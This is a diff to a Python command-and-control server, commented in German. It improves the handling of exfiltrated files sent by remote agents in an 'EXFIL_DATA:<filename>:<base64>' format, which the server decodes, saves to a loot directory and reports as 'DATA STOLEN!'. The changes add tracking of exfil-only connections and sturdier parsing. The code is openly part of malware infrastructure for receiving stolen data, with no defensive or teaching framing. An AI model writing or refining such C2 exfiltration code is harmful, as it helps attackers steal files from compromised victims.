@@ -124,6 +124,7 @@ def handle_client(
     clients[cid] = client_socket
 
     exfil_buffer = ""
+    is_exfil_only_connection = False  # Flag für reine Exfil-Verbindungen
     try:
         while True:
             # Clientantworten auf befehle erhalten
@@ -142,6 +143,7 @@ def handle_client(
                     continue  # Weiter sammeln
             elif "EXFIL_DATA" in chunk:
                 # Start einer EXFIL-Übertragung
+                is_exfil_only_connection = True  # Markiere als reine Exfil-Verbindung
                 exfil_buffer = chunk
                 if len(chunk) < 1048576:  # Alles in einem Chunk
                     data = exfil_buffer
@@ -157,7 +159,14 @@ def handle_client(
             elif "EXFIL_DATA" in data:
                 try:
                     # Format des Agents: "EXFIL_DATA:<filename>:<base64_string>"
-                    parts = data.strip().split(":", 2)
+                    # Extrahiere nur den "EXFIL_DATA:..." Teil (ohne die Rest-Response)
+                    exfil_start = data.find("EXFIL_DATA:")
+                    if exfil_start != -1:
+                        exfil_data = data[exfil_start:]
+                    else:
+                        exfil_data = data
+                    
+                    parts = exfil_data.strip().split(":", 2)
                     if len(parts) != 3:
                         raise ValueError(f"Invalid EXFIL format: expected 3 parts, got {len(parts)}")
                     
@@ -171,12 +180,13 @@ def handle_client(
                     save_path = os.path.join(LOOT_DIR, safe_filename)
 
                     # Decode and write
+                    print(f"\n{Colors.WARNING}[*] Decoding {len(b64_content)} bytes of Base64 data...{Colors.ENDC}")
                     decoded_data = base64.b64decode(b64_content)
                     with open(save_path, "wb") as f:
                         f.write(decoded_data)
 
                     print(
-                        f"\n{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
+                        f"{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
                     )
                     print(f"C2>", end="", flush=True)
 
@@ -184,7 +194,12 @@ def handle_client(
                     print(
                         f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
                     )
-                    print(f"[!] Data length: {len(data)}, starts with: {data[:100] if len(data) > 100 else data}")
+                    print(f"[!] Data length: {len(data)}")
+                    # Debug: Zeige die ersten paar Zeichen, um das Format zu prüfen
+                    if len(data) > 200:
+                        print(f"[!] Data starts with: {data[:200]}")
+                    else:
+                        print(f"[!] Data: {data}")
             else:
                 if len(data) > 2000:
                     preview = data[:200]
@@ -200,10 +215,19 @@ def handle_client(
         print(f"[!] Fehler mit client ID {cid}: {e}")
 
     finally:
-        with lock:
-            del clients[cid]
-        client_socket.close()
-        print(f"[-] Client ID {cid} discconnected")
+        # Nur von der Client-Liste entfernen, wenn es keine reine Exfil-Verbindung war
+        if not is_exfil_only_connection:
+            with lock:
+                if cid in clients:
+                    del clients[cid]
+            client_socket.close()
+            print(f"[-] Client ID {cid} disconnected")
+        else:
+            # Bei reinen Exfil-Verbindungen: keine Nachricht, nur aufräumen
+            with lock:
+                if cid in clients:
+                    del clients[cid]
+            client_socket.close()
 
 
 def broadcast_command(command: str) -> None:
